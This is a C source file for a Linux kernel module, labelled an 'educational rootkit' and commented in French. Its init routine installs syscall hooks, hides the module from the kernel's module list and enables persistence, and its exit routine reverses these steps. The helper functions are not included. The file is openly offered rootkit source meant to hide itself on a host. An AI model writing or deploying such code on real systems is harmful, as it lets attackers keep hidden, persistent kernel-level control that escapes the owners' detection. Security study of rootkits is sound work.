#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "rootkit.h"

/* Initialisation du module principal */
static int __init my_module_init(void)
{
    int ret;

    /* Installer les hooks pour les syscalls */
    ret = install_hooks();
    if (ret != 0) {
        printk(KERN_ERR "Erreur lors de l'installation des hooks\n");
        return ret;
    }

    /* Masquer le module de la liste */
    ret = hide_init(THIS_MODULE);
    if (ret != 0) {
        printk(KERN_ERR "Erreur lors du masquage du module\n");
        uninstall_hooks();
        return ret;
    }
    hide(THIS_MODULE, 1);

    /* Activer la persistance */
    ret = enable_persistence(THIS_MODULE->name);
    if (ret != 0) {
        printk(KERN_ERR "Erreur lors de l'activation de la persistance\n");
        hide(THIS_MODULE, 0);
        uninstall_hooks();
        return ret;
    }

    return 0;
}

/* Nettoyage du module principal */
static void __exit my_module_exit(void)
{
    /* Restaurer la visibilité du module */
    hide(THIS_MODULE, 0);

    /* Désinstaller les hooks */
    uninstall_hooks();
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkit éducatif");
MODULE_AUTHOR("2600");
